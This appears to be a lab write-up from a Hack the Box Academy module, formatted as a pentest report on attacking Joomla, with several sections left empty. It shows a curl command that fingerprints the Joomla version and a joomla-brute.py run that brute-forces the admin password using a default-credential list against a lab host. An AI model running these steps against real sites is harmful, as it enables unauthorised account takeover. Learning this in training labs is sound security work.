---
title: "Hack the Box"
subtitle: "Attacking Joomla"
author: "errbufferoverfl"
date: 2023-10-28T12:20:13+11:00
categories:
categories:
  - Learning
  - Hack the Box
  - Hack the Box Academy
  - Offensive
  - Joomla
---

## Summary


## Attack Chain: Compromising Joomla


## Findings

### Fingerprinting

```shell
curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2019 Open Source Matters, Inc.</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.10.0</version>
  <creationDate>August 2021</creationDate>
  <description>FILES_JOOMLA_XML_DESCRIPTION</description>
  <scriptfile>administrator/components/com_admin/script.php</scriptfile>
  <update>
    <schemas>
      <schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
      <schemapath type="sqlsrv">administrator/components/com_admin/sql/updates/sqlazure</schemapath>
      <schemapath type="sqlazure">administrator/components/com_admin/sql/updates/sqlazure</schemapath>
      <schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
    </schemas>
  </update>
  <fileset>
    <files>
      <folder>administrator</folder>
      <folder>bin</folder>
      <folder>cache</folder>
      <folder>cli</folder>
      <folder>components</folder>
      <folder>images</folder>
      <folder>includes</folder>
      <folder>language</folder>
      <folder>layouts</folder>
      <folder>libraries</folder>
      <folder>media</folder>
      <folder>modules</folder>
      <folder>plugins</folder>
      <folder>templates</folder>
      <folder>tmp</folder>
      <file>htaccess.txt</file>
      <file>web.config.txt</file>
      <file>LICENSE.txt</file>
      <file>README.txt</file>
      <file>index.php</file>
    </files>
  </fileset>
  <updateservers>
    <server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
  </updateservers>
</extension>
```

### Weak Password Requirements

*The affected host does not require users to have strong passwords, making it easier for threat actors to compromise user accounts.*

- **CWE:** CWE-521
- **CVSS 3.1 Score:** 9.1 Critical
- **CVSS 3.1 Temporal Score:** 8.7 High
- **Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:H/RL:O/RC:C
- **Security Impact:** When successfully exploited, weak password requirements can result in a threat actor gaining long-term unauthorised access to the users account. Depending on the permissions associated with the compromised account, impact can vary.
- **Affected Hosts:** app.inlanefreight.local

#### Reproduction

The following figure shows using joomla-bruteforce and the `rockyou` password list against `app.inlanefreight.local` to brute-force the password for the user account `admin`. 

```shell-session
python3 joomla-brute.py -u http://app.inlanefreight.local -w ../SecLists/Passwords/http_default_pass.txt -usr admin -v
 admin:admin
 admin:password
 admin:manager
 admin:letmein
 admin:cisco
 admin:default
 admin:root
 admin:apc
 admin:pass
 admin:security
 admin:user
 admin:system
 admin:sys
 admin:none
 admin:xampp
 admin:wampp
 admin:ppmax2011
 admin:turnkey
```


## Appendix A. Exploited Systems

- app.inlanefreight.local

## Appendix B. Compromised Users

The following is a list of user accounts compromised in the course of the assessment.


## Appendix C. Changes Made to the System & Artefacts Cleanup